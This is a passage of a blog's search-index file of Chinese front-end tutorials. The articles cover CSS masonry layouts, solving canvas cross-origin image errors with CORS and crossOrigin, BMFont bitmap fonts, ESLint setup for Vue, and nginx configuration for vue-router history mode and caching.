&lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133 @import url('https://fonts.googleapis.com/css?family=PT+Mono');@function set-counter-bg-color($color) &#123; @if (lightness($color) &gt; 50) &#123; @return darken($color, 60%); &#125; @else &#123; @return lighten($color, 50%); &#125;&#125;$bg: #0D0630;$itemBg1: #18314F;$itemBg2: #8BBEB2;$itemBg3: #E6F9AF;$itemBg4: #384E77;@mixin setColorAndHover($baseColor) &#123; color: $baseColor; &amp;:hover &#123; background: lighten($baseColor, 8%); &#125;&#125;body,html &#123; position: relative; width: 100%; height: 100%; background: $bg; font-family: "PT Mono", monospace;&#125;.masonry &#123; display: flex; flex-flow: column wrap; width: 100%; height: auto; @media screen and (min-width: 400px) &#123; height: 1600px; &#125; @media screen and (min-width: 600px) &#123; height: 1300px; &#125; @media screen and (min-width: 800px) &#123; height: 1100px; &#125; @media screen and (min-width: 1100px) &#123; height: 800px; &#125;&#125;.item &#123; box-sizing: border-box; padding: 10px; counter-increment: item-counter; &amp;__content &#123; position: relative; display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100%; height: 220px; font-size: 40px; color: darken($bg, 5%); background: currentColor; box-sizing: border-box; @include setColorAndHover($itemBg1); &amp;:before &#123; position: absolute; top: 0; left: 0; font-size: 13px; width: 2em; height: 2em; line-height: 2em; text-align: center; font-weight: bold; background-color: set-counter-bg-color($itemBg1); content: counter(item-counter); &#125; &amp;:after &#123; color: darken($bg, 10%); content: 'ಠ‿ಠ'; &#125; &amp;--small &#123; @include setColorAndHover($itemBg2); height: 100px; &amp;:before &#123; background: set-counter-bg-color($itemBg2); &#125; &amp;:after &#123; content: '♥◡♥'; &#125; &#125; &amp;--medium &#123; @include setColorAndHover($itemBg3); height: 175px; &amp;:before &#123; background: set-counter-bg-color($itemBg3); &#125; &amp;:after &#123; content: '◔ᴗ◔'; &#125; &#125; &amp;--large &#123; @include setColorAndHover($itemBg4); height: 280px; &amp;:before &#123; background: set-counter-bg-color($itemBg4); &#125; &amp;:after &#123; content: 'ಠ_๏'; &#125; &#125; &#125;&#125; 这个解决方案有一个最致命的地方，就是需要显式的给.masonry设置height，特别对于响应式设计来说这个更为不友好。而且当我们的项目列表是动态生成，而且内容不好控制之时，这就更蛋疼了。那么有没有更为友好的方案呢？ 单独的列容器 这个方案，我们需要对我们的HTML结构做一个变更。变更后的HTML结构看起来像这样： 1234567891011121314151617181920212223 &lt;div class="masonry"&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- more items --&gt; &lt;/div&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- more items --&gt; &lt;/div&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- more items --&gt; &lt;/div&gt;&lt;/div&gt; 不难发现，在div.item外面包了一层div.column，这个div.column称为列表项目的单独容器。在这个解决方案中，.masonry和.column都通过display:flex属性将其设置为Flex容器，不同的是.masonry设置为行（flex-direction:row），而.column设置为列（flex-direction）： 12345678910 .masonry &#123; display: flex; flex-direction: row;&#125;.column &#123; display: flex; flex-direction: column; width: calc(100%/3);&#125; 这里有一个需要注意，在.column咱们通过calc()方法来控制每个列的宽度，如果你希望是三列，那么可以设置width: calc(100% / 3);实际中根据自己的设计来设置width： 12345678910 .masonry &#123; display: flex; flex-direction: row;&#125;.column &#123; display: flex; flex-direction: column; width: calc(100%/3);&#125; 这种方案对应的响应式设计，需要在不同的媒体查询下修改width值，比如： 12345678910111213141516171819202122 .masonry &#123; display: flex; flex-direction: column;&#125;@media only screen and (min-width: 500px) &#123; .masonry &#123; flex-direction: row; &#125;&#125;.column &#123; display: flex; flex-flow: column wrap; width: 100%;&#125;@media only screen and (min-width: 500px) &#123; .column &#123; width: calc(100%/5); &#125;&#125; 效果如下（完整代码和效果图）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788 &lt;div class="masonry"&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="column"&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129 @import url('https://fonts.googleapis.com/css?family=PT+Mono');@function set-counter-bg-color($color) &#123; @if (lightness($color) &gt; 50) &#123; @return darken($color, 60%); &#125; @else &#123; @return lighten($color, 50%); &#125;&#125;$bg: #0D0630;$itemBg1: #18314F;$itemBg2: #8BBEB2;$itemBg3: #E6F9AF;$itemBg4: #384E77;@mixin setColorAndHover($baseColor) &#123; color: $baseColor; &amp;:hover &#123; background: lighten($baseColor, 8%); &#125;&#125;body,html &#123; position: relative; width: 100%; height: 100%; background: $bg; font-family: "PT Mono", monospace;&#125;.masonry &#123; display: flex; flex-direction: column; @media only screen and (min-width: 500px) &#123; flex-direction: row; &#125;&#125;.column &#123; display: flex; flex-flow: column wrap; width: 100%; @media only screen and (min-width: 500px) &#123; width: calc(100%/5); &#125;&#125;.item &#123; box-sizing: border-box; padding: 10px; counter-increment: item-counter; &amp;__content &#123; position: relative; display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100%; height: 220px; font-size: 40px; color: darken($bg, 5%); background: currentColor; box-sizing: border-box; @include setColorAndHover($itemBg1); &amp;:before &#123; position: absolute; top: 0; left: 0; font-size: 13px; width: 2em; height: 2em; line-height: 2em; text-align: center; font-weight: bold; background-color: set-counter-bg-color($itemBg1); content: counter(item-counter); &#125; &amp;:after &#123; color: darken($bg, 10%); content: 'ಠ‿ಠ'; &#125; &amp;--small &#123; @include setColorAndHover($itemBg2); height: 100px; &amp;:before &#123; background: set-counter-bg-color($itemBg2); &#125; &amp;:after &#123; content: '♥◡♥'; &#125; &#125; &amp;--medium &#123; @include setColorAndHover($itemBg3); height: 175px; &amp;:before &#123; background: set-counter-bg-color($itemBg3); &#125; &amp;:after &#123; content: '◔ᴗ◔'; &#125; &#125; &amp;--large &#123; @include setColorAndHover($itemBg4); height: 280px; &amp;:before &#123; background: set-counter-bg-color($itemBg4); &#125; &amp;:after &#123; content: 'ಠ_๏'; &#125; &#125; &#125;&#125; 从实战结果已经告诉你答案了。只不过在结构上变得冗余一点。 这个实现了item的水平排布，但是需要事先手动分数据 Grid Grid将是布局当中的一把利剑，也可以说是神器，特别是今年得到了众多浏览器的支持。记得去年在CSSConf分享后，有同学问我Grid是否能实现瀑布流的布局。说实话，虽然Grid对于布局而言是非常的强大，但要很好的实现瀑布流布局还是非常的蛋疼。@Rachel Andrew在她 分享的文章中也特意提到过实现瀑布流的方案。从文章中摘出有关于瀑布流布局的那部分内容。 Grid制作瀑布流，对于结构而言和Multi-columns示例中的一样。只不过在.masonry使用display:grid来进行声明： 123456 .masonry &#123; display: grid; grid-gap: 40px; grid-template-columns: repeat(3, 1fr); grid-auto-rows: minmax(50px, auto);&#125; 对于.item较为蛋疼，需要分别通过grid-row和grid-column来指定列表项目所在的区域，比如： 12345678910 .masonry &gt; div:nth-child(1) &#123; grid-row: 1 / 4; grid-column: 1;&#125;.masonry &gt; div:nth-child(2) &#123; grid-row: 1 / 3; grid-column: 2;&#125;... 将效果Fork过来（全部代码和效果图）： 123456789 &lt;div class="grid"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt; &lt;div&gt;6&lt;/div&gt; &lt;div&gt;7&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 .grid &#123; margin: 50px; padding: 20px; background-color: #e3fafc; border: 1px solid #99e9f2; display: grid; grid-gap: 40px; grid-template-columns: repeat(3, 1fr); grid-auto-rows: minmax(50px, auto);&#125;.grid &gt; div &#123; border: 1px solid #3bc9db; border-radius: 3px; background-color: #99e9f2; font-size:250%; color: #fff; display: flex; align-items: center; justify-content: center;&#125;.grid &gt; div:nth-child(1) &#123; grid-row: 1 / 4; grid-column: 1;&#125;.grid &gt; div:nth-child(2) &#123; grid-row: 1 / 3; grid-column: 2;&#125;.grid &gt; div:nth-child(3) &#123; grid-row: 1 / 4; grid-column: 3;&#125;.grid &gt; div:nth-child(4) &#123; grid-row: 4 / 7; grid-column: 1;&#125;.grid &gt; div:nth-child(5) &#123; grid-row: 3 / 7; grid-column: 2;&#125;.grid &gt; div:nth-child(6) &#123; grid-row: 4 / 6; grid-column: 3;&#125; 在Grid中有自动排列的算法的属性： 如果没有明确指定网格项目位置，网格会按自动排列算法，将它最大化利用可用空间 如果在当前行没有可用位置，网格会自动搜索下一行，这样会造成一定的差距，浪费可用空间 可以把grid-auto-flow的row值改变auto，可以切换搜索顺序 grid-auto-flow还可以接受另一个关键词。默认情况下，其值是sparse，但我们可以将其显式的设置为dense，让网格项目试图自动填补所有可用的空白空间 言外之意，Grid中自动排列的算法对于实现瀑布流布局有很大的帮助。不过对于堆栈（列表项目）高度不能友好的控制。 总结 这篇文章主要介绍了如何使用纯CSS实现瀑布流的布局。文章简单介绍了三种实现方案：Multi-columns、Flexbox和Grid。从上面的示例或者实现手段而言，较我友好的是Flexbox的方案。当然，随着CSS Grid特性的完善，使用Grid实现瀑布流布局将会变得更为简单和友好。那让我们拭目以待。当然如果你觉得这些方案都不太好，你可以依旧可以考虑JavaScript的解决方案。如果你有更好的解决方案，也希望能在下面的评论中与我们一起分享。]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>瀑布流</tag>
        <tag>masonry-layout</tag>
        <tag>isotope-layout</tag>
        <tag>Multi-columns</tag>
        <tag>Flexbox</tag>
        <tag>Grid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决canvas图片getImageData,toDataURL跨域问题]]></title>
    <url>%2Fblob%2F2019-03-25-solve-the-cross-domain-problem-of-canvas-image-getimagedata-and-todataurl%2F</url>
    <content type="text"><![CDATA[本篇文字出处https://www.zhangxinxu.com/wordpress/2018/02/crossorigin-canvas-getimagedata-cors/ 图片服务器需要配置Access-Control-Allow-Origin 一般团队都会有一个专门域名放置静态资源，例如腾讯是gtimg.com，百度是bdimg.com；或者很多团队使用的是腾讯云或者阿里云的服务。 而主页面所在域名往往不一样，当需要需要对canvas图片进行getImageData()或toDataURL()操作的时候，跨域问题就出来了，而且跨域问题还不止一层。 首先，第一步，图片服务器需要配置Access-Control-Allow-Origin信息，例如： 如PHP添加响应头信息，*通配符表示允许任意域名： 1 header(&quot;Access-Control-Allow-Origin: *&quot;); 或者指定域名： 1 header(&quot;Access-Control-Allow-Origin: www.zhangxinxu.com&quot;); 此时，Chrome浏览器就不会有Access-Control-Allow-Origin相关的错误信息了，但是，还会有其他的跨域错误信息。 canvas图片getImageData cross-origin跨域问题 对于跨域的图片，只要能够在网页中正常显示出来，就可以使用canvas的drawImage() API绘制出来。但是如果你想更进一步，通过getImageData()方法获取图片的完整的像素信息，则多半会出错。 举例来说，使用下面代码获取github上的自己头像图片信息： 123456789 var canvas = document.createElement('canvas');var context = canvas.getContext('2d');var img = new Image();img.onload = function () &#123; context.drawImage(this, 0, 0); context.getImageData(0, 0, this.width, this.height);&#125;;img.src = 'https://avatars3.githubusercontent.com/u/496048?s=120&amp;v=4';'; 结果在Chrome浏览器下显示如下错误： Uncaught DOMException: Failed to execute ‘getImageData’ on ‘CanvasRenderingContext2D’: The canvas has been tainted by cross-origin data. 出错信息截图 Firefox浏览器错误为： SecurityError: The operation is insecure. 如果使用的是canvas.toDataURL()方法，则会报： Failed to execute ‘toDataURL’ on ’HTMLCanvasElement’: Tainted canvased may not be exported 原因其实都是一样的，跨域导致。 那有没有什么办法可以解决这个问题呢？ 可以试试crossOrigin属性。 HTML crossOrigin属性解决资源跨域问题 在HTML5中，有些元素提供了支持CORS(Cross-Origin Resource Sharing)（跨域资源共享）的属性，这些元素包括&lt;img&gt;，&lt;video&gt;，&lt;script&gt;等，而提供的属性名就是crossOrigin属性。 因此，上面的跨域问题可以这么处理： 12345678910 var canvas = document.createElement('canvas');var context = canvas.getContext('2d');var img = new Image();img.crossOrigin = '';img.onload = function () &#123; context.drawImage(this, 0, 0); context.getImageData(0, 0, this.width, this.height);&#125;;img.src = 'https://avatars3.githubusercontent.com/u/496048?s=120&amp;v=4';'; 增加一个img.crossOrigin = &#39;&#39;即可，虽然JS代码这里设置的是空字符串，实际上起作用的属性值是anonymous。 crossOrigin可以有下面两个值： 关键字 释义 anonymous 元素的跨域资源请求不需要凭证标志设置。 use-credentials 元素的跨域资源请求需要凭证标志设置，意味着该请求需要提供凭证。 其中，只要crossOrigin的属性值不是use-credentials，全部都会解析为anonymous，包括空字符串，包括类似&#39;abc&#39;这样的字符。 例如： 123 img.crossOrigin = 'abc';console.log(img.crossOrigin); // 结果是'anonymous'crossOrigin解析为anonymous 另外还有一点需要注意，那就是虽然没有crossOrigin属性，和设置crossOrigin=&quot;use-credentials&quot;在默认情况下都会报跨域出错，但是性质上却不一样，两者有较大区别。 crossOrigin兼容性 IE11+(IE Edge)，Safari，Chrome，Firefox浏览器均支持，IE9和IE10会报SecurityError安全错误，如下截图： crossOrigin属性为什么可以解决资源跨域问题？ crossOrigin=anonymous相对于告诉对方服务器，你不需要带任何非匿名信息过来。例如cookie，因此，当前浏览器肯定是安全的。 就好比你要去别人家里拿一件衣服，crossOrigin=anonymous相对于告诉对方，我只要衣服，其他都不要。如果不说，可能对方在衣服里放个窃听器什么的，就不安全了，浏览器就会阻止。 IE10浏览器不支持crossOrigin怎么办？ 我们请求图片的时候，不是直接通过new Image()，而是借助ajax和URL.createObjectURL()方法曲线救国。 代码如下： 123456789101112131415 var xhr = new XMLHttpRequest();xhr.onload = function () &#123; var url = URL.createObjectURL(this.response); var img = new Image(); img.onload = function () &#123; // 此时你就可以使用canvas对img为所欲为了 // ... code ... // 图片用完后记得释放内存 URL.revokeObjectURL(url); &#125;; img.src = url;&#125;;xhr.open('GET', url, true);xhr.responseType = 'blob';xhr.send(); 此方法不仅IE10浏览器OK，原本支持crossOrigin的诸位浏览器也是支持的。 也就多走一个ajax请求，还可以！ 根据，根据实践发现，在IE浏览器下，如果请求的图片过大，几千像素那种，图片会加载失败，我猜是超过了blob尺寸限制。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>canvas</tag>
        <tag>跨域</tag>
        <tag>getImageData</tag>
        <tag>toDataURL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[免费的位图字体制作工具Bitmap Font]]></title>
    <url>%2Fblob%2F2019-03-25-free-bitmap-font%2F</url>
    <content type="text"><![CDATA[导读 今天写一个车牌的样式，产品要求车牌字体宽度一致，想到的方法有单独设置每个字符的位置、制作等宽字体包、使用font-family: Consolas, Monaco, monospace;字体等；诸如什么设置字体两端对齐都是浮云，连续的英文根本不听话。 字体包没人给做，使用默认字体又不美观，最后的结果就是左对齐！！！ 看到有提到自己制作字体的工具，这里只是简单做了尝试。 官方下载地址 http://www.angelcode.com/products/bmfont/ 下载完成后按照使用步骤来使用。 使用步骤 录入需要提取的文字 新建一个text文档，然后输入你想要生成的字，比如，输入1234567890这几个数字，你就能生成这几个数字的Font字体，但是，记住，只有输入的字才能被生成对应的字体，比如你上面只是输入这几个数字，最后生成Font字体后你要是想打出汉子或者字母那么结果肯定就是打不出来的。 最后保存的时候切记一定要是：UTF-8格式的，不然最后编码可能会出错。 设置字体 打开软件，选择Opotion-&gt;FontSetting，来设定需要导出的字体 点击展开得到如下界面，然后我来解释下这几个参数， Font也就是你要选的字体样式如微软雅黑呀什么的， Size:字体的大小， Match char height: 匹配字符的高度， Bold：字体加粗Ltalic:斜体， Font smoothing:让字体平滑， Level：就是字体的水平距离一般设置像上面的一样都能满足平时的要求。（这里的设置就是我们以后会用到的字的属性）。 如果是自定义字体包，可以通过Add font file加入字体，在Font中查找新加入的字体。 清空字符 选择菜单 Edit-&gt;Clear all chars in font 清空下字符 导入字符 选择菜单 Edit-&gt;Selecting text from file… 选择刚刚新建的txt文件 设定导出的样式 Option-&gt;ExportOptions来设定导出的样式等 点开后设置参数。 Padding，文字的内边框，或者理解为文字的周边留空要多大 做后期样式时这个属性很重要，需要预留空间来给描边、发光等特效使用 比如我预计我的样式要加一个2px的边框，然后加一个右下角2px的投影效果，所以我设定了padding:2px 4px 4px 2px Spacing : 2个字体之间的间隔是多大 Width Heigth 这个就是我们等下导出的图片的大小。这里要注意数字越大占用的资源空间就越大，所以我们要选个合适的值（2的n次幂）。 Bit depth 选择32，要不你的字体不会很清晰。 Font descriptor 选择Text。 Textures 纹理图片格式，果断png。 导出 option-&gt;Save bitmap font as… 导出成一个文理文件和一个描述文件，如果按照上面的配置，会有一个.png和一个.fnt 后期处理 用photoshop处理导出的png文件 后期处理了 视自己的情况定 参考 http://www.cppblog.com/tx7do/archive/2017/12/24/215442.html https://jingyan.baidu.com/article/7f41ecec3afd09593c095c63.html https://www.zhangxinxu.com/wordpress/2016/07/monospaced-font-css3-ch-unit/]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>BitmapFont</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue 项目添加 eslint]]></title>
    <url>%2Fblob%2F2019-03-18-vue-project-add-eslint%2F</url>
    <content type="text"><![CDATA[本篇为随笔，紧紧作为记录作用 使用eslint 官网 http://eslint.org standardjs 风格 https://standardjs.com/ https://github.com/standard/standard vue检验规则 https://eslint.vuejs.org/rules/ eslint 支持postcss 使用 https://github.com/postcss/eslint-config-postcss 暂未使用，postcss-bem写法警告还是存在 (Unknow at rule @component-namespace css.lint.unknownAtRules(unknownAtRules))，且会检验typescript格式。 eslint-config-postcss 依赖 @logux/eslint-config eslint-plugin-jest eslint-plugin-security eslint-plugin-prefer-let 和 eslint-config-standard eslint-plugin-promise eslint-plugin-standard eslint-plugin-import eslint-plugin-node，后一部分为当前项目使用的依赖 https://github.com/postcss/eslint-config-postcss css规则 https://blog.csdn.net/lfcss/article/details/82787113 npm i -D eslint eslint-plugin-vue eslint-config-standard eslint-friendly-formatter eslint-loader eslint-plugin-html eslint-plugin-import eslint-plugin-node eslint-plugin-promise eslint-plugin-standard .eslintignore 12345 /build//config//node_modules/*/output//static/ .eslintrc.js 12345678910111213141516171819202122232425262728293031323334 module.exports = &#123; root: true, parser: &apos;babel-eslint&apos;, parserOptions: &#123; sourceType: &apos;module&apos; &#125;, env: &#123; browser: true, &#125;, // https://github.com/standard/standard/blob/master/docs/RULES-en.md extends: [ // https://github.com/vuejs/eslint-plugin-vue#priority-a-essential-error-prevention // consider switching to `plugin:vue/strongly-recommended` or `plugin:vue/recommended` for stricter rules. &apos;plugin:vue/essential&apos;, // https://github.com/standard/standard/blob/master/docs/RULES-en.md &apos;standard&apos; ], // required to lint files plugins: [ &quot;html&quot;, &quot;standard&quot;, // standard风格的依赖包 &quot;promise&quot;, &quot;vue&quot; ], // add your custom rules here rules: &#123; // allow async-await &apos;generator-star-spacing&apos;: &apos;off&apos;, // allow debugger during development &apos;no-debugger&apos;: process.env.NODE_ENV === &apos;production&apos; ? &apos;error&apos; : &apos;off&apos;, &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 https://github.com/standard/standard/blob/master/docs/RULES-en.md // 符合这个标准// 代码刷新后 浏览器会报出 warning 浏览器中能看到// 针对容易网架构// 1. 在package.json中添加 &quot;eslint&quot;: &quot;^3.19.0&quot;, &quot;eslint-config-standard&quot;: &quot;^10.2.1&quot;, &quot;eslint-friendly-formatter&quot;: &quot;^3.0.0&quot;, &quot;eslint-loader&quot;: &quot;^1.7.1&quot;, &quot;eslint-plugin-html&quot;: &quot;^3.0.0&quot;, &quot;eslint-plugin-import&quot;: &quot;^2.7.0&quot;, &quot;eslint-plugin-node&quot;: &quot;^5.2.0&quot;, &quot;eslint-plugin-promise&quot;: &quot;^3.4.0&quot;, &quot;eslint-plugin-standard&quot;: &quot;^3.0.1&quot;, &quot;babel-eslint&quot;: &quot;^7.1.1&quot;// 2.在webpack.site.base.js 中添加 // 一个函数 function resolve (dir) &#123; return path.join(__dirname, &apos;..&apos;, dir) &#125; // 在rules中添加 &#123; test: /\.(js|vue)$/, loader: &apos;eslint-loader&apos;, enforce: &apos;pre&apos;, include:[resolve(&apos;business&apos;)], options: &#123; formatter: require(&apos;eslint-friendly-formatter&apos;), emitWarning: true &#125; &#125;// 3 引入.eslintrc.js // 编辑还能检测的 推荐使用vscode 安装eslink插件 并全局安装 cnpm install -g eslint// https://eslint.org/docs/user-guide/configuringmodule.exports = &#123; root: true, parser: &apos;babel-eslint&apos;, parserOptions: &#123; sourceType: &apos;module&apos; &#125;, env: &#123; browser: true, &#125;, // https://github.com/standard/standard/blob/master/docs/RULES-en.md extends: &apos;standard&apos;, // required to lint *.vue files plugins: [ &apos;html&apos; ], // add your custom rules here rules: &#123; // allow async-await &apos;generator-star-spacing&apos;: &apos;off&apos;, // allow debugger during development &apos;no-debugger&apos;: process.env.NODE_ENV === &apos;production&apos; ? &apos;error&apos; : &apos;off&apos; &#125;&#125;// 4 引入.editorconfig // 安装EditorConfig插件 保证建立的文件一致root = true[*]charset = utf-8indent_style = spaceindent_size = 2end_of_line = lfinsert_final_newline = truetrim_trailing_whitespace = true// 5 引入.eslintignore /build/ vue配置例子 1：https://www.cnblogs.com/fengyingYZ/p/10369703.html vue配置例子2：https://www.cnblogs.com/hahazexia/p/6393212.html]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Eslint</tag>
        <tag>standard</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-router history模式nginx配置并配置静态资源缓存]]></title>
    <url>%2Fblob%2F2019-02-18-vue-router-history-mode-nginx-configuration-and-configuration-of-static-resource-cache%2F</url>
    <content type="text"><![CDATA[背景 vue-router配置history模式后，index.html在域名根目录，需要把页面指向index.html，加载成功后vue根据路由信息加载页面。 每次更新都会更新index.html内引用资源的hash值，如何保证每次更新后不使用强制刷新就能加载正确的资源文件。 原始配置 一个基本的前端nginx会有接口转发，静态文件地址并指向默认文件。见如下代码： 123456789101112131415 server &#123; listen 80; server_name localhost; # 接口转发 location ~ ^/api &#123; proxy_pass http://xxx.com:3000; &#125; # 路由和静态文件配置 location / &#123; root /xxx/dist; index index.html index.htm; &#125;&#125; history模式配置 因为history不会指向具体的html地址，需要配置无法读取静态文件的地址指向起始页。 123456789101112131415161718192021 server &#123; listen 80; server_name localhost; # 接口转发 location ~ ^/api &#123; proxy_pass http://xxx.com:3000; &#125; # 路由和静态文件配置 location / &#123; root /xxx/dist; index index.html index.htm; try_files $uri $uri/ @rewrites; &#125; # 路由index.html配置 location @rewrites &#123; rewrite ^(.+)$ /index.html break; &#125;&#125; history模式升级版 在实际生产活动中，每一次上线都希望发布的的内容不需要用户强制刷新即可呈现在用户的眼前。 因此根据history模式的实际情况，首先对指定了具体文件格式的静态文件设定30天的有效期；其次路由访问的index.html设置为不缓存。 注意： 这个配置针对具有hash值的静态文件，先设置强制缓存，再设置协商缓存；如果存在没有hash值的静态文件，建议不设置强制缓存，仅通过协商缓存判断是否需要使用缓存。 因此当前配置仅指定index.html无强制缓存，其他具有hash的静态文件有强制缓存。 123456789101112131415161718192021222324252627 server &#123; listen 80; server_name localhost; # 静态文件设定30天的有效期 location ~ \.(html|css|js|jpg|png|gif|swf|woff|woff2|eot|svg|ttf|otf|mp3|m4a|aac|txt)$ &#123; root /xxx/dist; expires 30d; &#125; # 接口转发 location ~ ^/api &#123; proxy_pass http://xxx.com:3000; &#125; # 路由配置页面无缓存 location / &#123; root /xxx/dist; index index.html index.htm; expires -1; add_header Cache-Control no-cache; try_files $uri $uri/ @rewrites; &#125; location @rewrites &#123; rewrite ^(.+)$ /index.html break; &#125;&#125; 再次应用 上面使用的配置皆是在一个域名下面只有一套静态页面，此次解决同一个域名多套静态页面，共用一个服务端接口。 webpack的配置 输出编译后文件到项目根目录下的output/app_static目录下。当然因为多个项目，每个项目的名称肯定不同。 在此处webpack的配置中moduleName作为当前项目的名称. 编译后引用的资源文件路径前缀是/app_static/xxx/xxx.xx 12345678910111213141516171819202122232425262728 const path = require('path');const projectRoot = process.cwd();const webpack = require('webpack');let moduleName = 'app';let staticName = `$&#123;moduleName&#125;_static`;module.exports = &#123; entry: "./public/main/app.js", output: &#123; libraryTarget: 'var', path: path.resolve(projectRoot, './output/' + staticName + '/'), publicPath: '/' + staticName + '/', filename: '[name]_[hash:8].js', chunkFilename: '[name]_[hash:8].js' &#125;, plugins: [ // ...... new webpack.DefinePlugin(&#123; ENV: JSON.stringify('online'), MODULE_NAME: JSON.stringify(moduleName) &#125;), // ...... ], // ......&#125; vue-router的配置 路由前缀为/app/xxx/xxx 123456789101112131415161718192021222324252627 var router = new VueRouter(&#123; mode: 'history', base: `/$&#123;MODULE_NAME&#125;/`, routes: [ &#123; path: '', name: `/$&#123;MODULE_NAME&#125;`, redirect: &#123; name: 'home' &#125;, component: resolve =&gt; require(['business'], resolve), children: [ &#123; path: 'home', name: 'home', component: resolve =&gt; require(['business/home'], resolve) &#125;, // ...... ] &#125;, &#123; path: '*', redirect: &#123; name: 'home' &#125;, component: Vue.extend(&#123; template: '&lt;router-view transition="fade" transition-mode="out-in"&gt;&lt;/router-view&gt;' &#125;) &#125; ]&#125;); nginx根目录的文件结构 nginx根目录下面存在多个项目的静态文件 123456789 /xxxx/dist|-- app_static| |-- ......| `-- index.html||-- music_static| |-- ......| `-- index.html`-- ...... nginx的配置 123456789101112131415161718192021222324252627 server &#123; listen 80; server_name localhost; # 静态文件设定30天的有效期 location ~ \.(html|css|js|jpg|png|gif|swf|woff|woff2|eot|svg|ttf|otf|mp3|m4a|aac|txt)$ &#123; root /xxx/dist; expires 30d; &#125; # 接口转发 location ~ ^/api &#123; proxy_pass http://xxx.com:3000; &#125; # 路由配置页面无缓存 location ~ ^/(app|music)/ &#123; root /xxx/dist; index index.html index.htm; expires -1; add_header Cache-Control no-cache; try_files $uri $uri/ @rewrites; &#125; location @rewrites &#123; rewrite ^/(app|music)/ /$1_static/index.html break; &#125;&#125; 访问地址 http://localhost/app/homehttp://localhost/music/home 注意 history路由使用app前缀，资源文件路径使用app_static前缀，是为了更好的区分两种访问的url。 多页配置 上面说的仅仅是单页应用的nginx配置，对于多页的还会有所不同。 